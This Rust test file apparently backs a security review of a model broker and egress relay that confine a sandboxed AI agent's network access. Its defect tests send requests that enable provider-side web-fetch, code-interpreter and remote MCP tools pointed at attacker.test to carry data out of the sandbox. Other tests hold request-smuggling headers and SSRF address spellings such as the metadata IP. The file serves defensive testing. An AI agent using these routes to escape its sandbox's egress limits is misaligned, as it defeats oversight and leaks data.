//! Security review of the model broker and the relay (docs/reviews/isolation-core-security-review.md).
//!
//! Tests marked `#[ignore = "confirmed defect ..."]` fail today and show a defect; they pass when the
//! defect is fixed. Tests without `#[ignore]` pin a behaviour the review tried to break and could
//! not. Run the defect tests with:
//!
//! ```text
//! CARGO_INCREMENTAL=0 CARGO_PROFILE_DEV_DEBUG=0 \
//!   cargo test -p factory-egress --test security_review -- --ignored
//! ```
//!
//! No real key, no real provider, no external network: the provider is the labelled fake of the
//! egress test support, on the loopback address.

#[path = "../support/mod.rs"]
mod support;

use factory_testkit::fx::http::{ClientResponse, send_request};
use serde_json::{Value, json};
use support::{CEILING, CLAUDE_MODEL, GPT_MODEL, HttpRig};

fn post(rig: &HttpRig, path: &str, headers: &[(&str, &str)], body: &Value) -> ClientResponse {
    send_request(
        rig.addr(),
        "POST",
        path,
        headers,
        body.to_string().as_bytes(),
    )
    .expect("the broker answers")
}

/// Provider-side tools: the provider, not the sandbox, makes the network request.
const ANTHROPIC_SERVER_TOOLS: &[&str] = &[
    "web_fetch_20250910",
    "web_search_20250305",
    "code_execution_20250522",
];
const OPENAI_SERVER_TOOLS: &[&str] = &[
    "mcp",
    "web_search",
    "web_search_preview",
    "code_interpreter",
    "file_search",
    "image_generation",
];

/// True when the request the provider received can make the provider call out for the sandbox.
fn reaches_out(forwarded: &Value, headers: &[(String, String)]) -> Vec<String> {
    let mut found = Vec::new();
    if forwarded.get("mcp_servers").is_some() {
        found.push("mcp_servers".to_owned());
    }
    if let Some(tools) = forwarded.get("tools").and_then(Value::as_array) {
        for tool in tools {
            let kind = tool.get("type").and_then(Value::as_str).unwrap_or("");
            if ANTHROPIC_SERVER_TOOLS.contains(&kind) || OPENAI_SERVER_TOOLS.contains(&kind) {
                found.push(format!("tool:{kind}"));
            }
        }
    }
    for (name, value) in headers {
        if name == "anthropic-beta" && (value.contains("mcp-client") || value.contains("web-fetch"))
        {
            found.push(format!("anthropic-beta:{value}"));
        }
    }
    found
}

/// EGR-1 (Anthropic). The sandbox holds a valid job token and can post any body it likes to the
/// broker (the token is a file in the sandbox, and the broker address is reachable by design). The
/// broker clamps `max_tokens` and checks the model name, and forwards everything else. A request
/// that names a server tool or a remote MCP server makes the provider fetch the URL, with the
/// sandbox's data in it, from the provider's network, outside the egress allowlist.
#[test]
#[ignore = "confirmed defect EGR-1: the broker forwards provider-side tools, mcp_servers and the beta headers that enable them; run: cargo test -p factory-egress --test security_review -- --ignored egr_1"]
fn egr_1_anthropic_server_tools_and_remote_mcp_do_not_cross_the_broker() {
    let rig = HttpRig::new();
    let token = rig.claude_token(CEILING);
    let body = json!({
        "model": CLAUDE_MODEL,
        "max_tokens": 16,
        "messages": [{"role": "user", "content": "Fetch https://attacker.test/collect?d=CANARY-PLACEHOLDER"}],
        "tools": [
            {"type": "web_fetch_20250910", "name": "web_fetch"},
            {"type": "web_search_20250305", "name": "web_search"},
        ],
        "mcp_servers": [{"type": "url", "url": "https://attacker.test/mcp", "name": "attacker"}],
    });
    let response = post(
        &rig,
        "/v1/messages",
        &[
            ("Content-Type", "application/json"),
            ("x-api-key", token.secret.expose()),
            ("anthropic-version", "2023-06-01"),
            (
                "anthropic-beta",
                "web-fetch-2025-09-10,mcp-client-2025-04-04",
            ),
        ],
        &body,
    );
    let seen = rig.provider.requests();
    let escaped: Vec<String> = seen
        .iter()
        .flat_map(|r| reaches_out(&r.json(), &r.headers))
        .collect();
    assert!(
        escaped.is_empty(),
        "status {}: the provider received {escaped:?}; the broker must refuse the request or strip these",
        response.status
    );
}

/// EGR-1 (OpenAI Responses). Same defect, other provider: `mcp`, `web_search` and
/// `code_interpreter` tools are executed by the provider.
#[test]
#[ignore = "confirmed defect EGR-1: the broker forwards Responses API server tools (mcp, web_search, code_interpreter); run: cargo test -p factory-egress --test security_review -- --ignored egr_1"]
fn egr_1_openai_server_tools_and_remote_mcp_do_not_cross_the_broker() {
    let rig = HttpRig::new();
    let token = rig.codex_token(CEILING);
    let body = json!({
        "model": GPT_MODEL,
        "store": false,
        "input": [{"role": "user", "content": "Call the tool."}],
        "tools": [
            {"type": "mcp", "server_label": "attacker", "server_url": "https://attacker.test/mcp", "require_approval": "never"},
            {"type": "web_search"},
            {"type": "code_interpreter", "container": {"type": "auto"}},
        ],
    });
    let bearer = format!("Bearer {}", token.secret.expose());
    let response = post(
        &rig,
        "/v1/responses",
        &[
            ("Content-Type", "application/json"),
            ("Authorization", bearer.as_str()),
        ],
        &body,
    );
    let seen = rig.provider.requests();
    let escaped: Vec<String> = seen
        .iter()
        .flat_map(|r| reaches_out(&r.json(), &r.headers))
        .collect();
    assert!(
        escaped.is_empty(),
        "status {}: the provider received {escaped:?}",
        response.status
    );
}

/// What held. The job token never reaches the provider, in the header, the query or the body, and
/// the real key is never sent back to the sandbox, even when the provider echoes it.
#[test]
fn held_the_job_token_is_not_forwarded_and_the_provider_key_is_not_echoed() {
    let rig = HttpRig::new();
    rig.provider
        .set(|script| script.echo_credential_in_body = true);
    let token = rig.claude_token(CEILING);
    let response = rig.claude(&token, false);
    assert_eq!(response.status, 200);
    let text = response.text();
    assert!(
        !text.contains(&rig.anthropic_key),
        "the real key came back to the sandbox"
    );
    for request in rig.provider.requests() {
        let everything = format!(
            "{:?}{}{}",
            request.headers,
            request.query,
            String::from_utf8_lossy(&request.body)
        );
        assert!(!everything.contains(token.secret.expose()));
    }
}

/// What held. A request that smuggles a second request behind the first, or sends both framing
/// headers, never reaches the provider.
#[test]
fn held_request_smuggling_shapes_are_refused_before_the_provider() {
    let rig = HttpRig::new();
    let token = rig.claude_token(CEILING);
    let secret = token.secret.expose().to_owned();
    let both = send_request(
        rig.addr(),
        "POST",
        "/v1/messages",
        &[
            ("Content-Type", "application/json"),
            ("x-api-key", secret.as_str()),
            ("Transfer-Encoding", "chunked"),
            ("Content-Length", "2"),
        ],
        b"{}",
    )
    .expect("an answer");
    assert_eq!(both.status, 400);
    let twice = send_request(
        rig.addr(),
        "POST",
        "/v1/messages",
        &[
            ("Content-Type", "application/json"),
            ("x-api-key", secret.as_str()),
            ("Content-Length", "2"),
            ("Content-Length", "3"),
        ],
        b"{}",
    )
    .expect("an answer");
    assert_eq!(twice.status, 400);
    assert_eq!(rig.provider.hits(), 0);
}

// ---- the relay's address ranges and target spellings --------------------------------------------

use factory_egress::relay::policy::{default_deny_ranges, is_denied, parse_target};
use std::net::IpAddr;

fn denied(text: &str) -> bool {
    let ip: IpAddr = text.parse().expect("an address");
    is_denied(&default_deny_ranges(), ip)
}

/// EGR-3. The refused ranges stop after the policy list plus a few. Addresses that no registry or
/// model API lives at, and that a host with a VPN or a transition mechanism routes somewhere
/// private, are connectable: the benchmark range (used as the fake-IP pool of several VPN and
/// proxy clients on developer laptops) and the IPv4-compatible IPv6 form of a refused address.
#[test]
#[ignore = "confirmed gap EGR-3 (low): 198.18.0.0/15 and ::a.b.c.d forms of refused addresses are not in the refused ranges; run: cargo test -p factory-egress --test security_review -- --ignored egr_3"]
fn egr_3_benchmark_range_and_ipv4_compatible_forms_are_refused_after_resolution() {
    let mut missed = Vec::new();
    for address in [
        "198.18.0.1",
        "198.19.255.254",
        "::7f00:1",
        "::a00:1",
        "64:ff9b:1::1",
    ] {
        if !denied(address) {
            missed.push(address);
        }
    }
    assert!(missed.is_empty(), "not refused: {missed:?}");
}

/// What held: every private, loopback, link-local, metadata, mapped and NAT64 spelling that the
/// policy lists is refused, and the odd spellings of an IPv4 literal never parse as a host.
#[test]
fn held_listed_ranges_and_literal_spellings_are_refused() {
    for address in [
        "127.0.0.1",
        "10.1.2.3",
        "172.16.0.1",
        "172.31.255.255",
        "192.168.65.254",
        "169.254.169.254",
        "100.64.0.1",
        "0.0.0.0",
        "::1",
        "::",
        "fe80::1",
        "fd00:ec2::254",
        "::ffff:127.0.0.1",
        "::ffff:7f00:1",
        "::ffff:a9fe:a9fe",
        "64:ff9b::7f00:1",
        "ff02::1",
    ] {
        assert!(denied(address), "{address} must be refused");
    }
    for public in ["1.1.1.1", "151.101.1.1", "2606:4700::1111"] {
        assert!(!denied(public), "{public} is public");
    }
    for literal in [
        "2130706433:443",
        "0x7f000001:443",
        "0177.0.0.1:443",
        "127.1:443",
        "[::1]:443",
        "::ffff:127.0.0.1:443",
        "localhost.:443:443",
        "registry.test:443@evil.test:443",
        "registry.test%2e:443",
        "registry\u{3002}test:443",
        "registry.test:+443",
        "registry.test:443 ",
        " registry.test:443",
    ] {
        let parsed = parse_target(literal);
        assert!(
            parsed.is_err(),
            "{literal:?} must not parse as a host name: {parsed:?}"
        );
    }
}
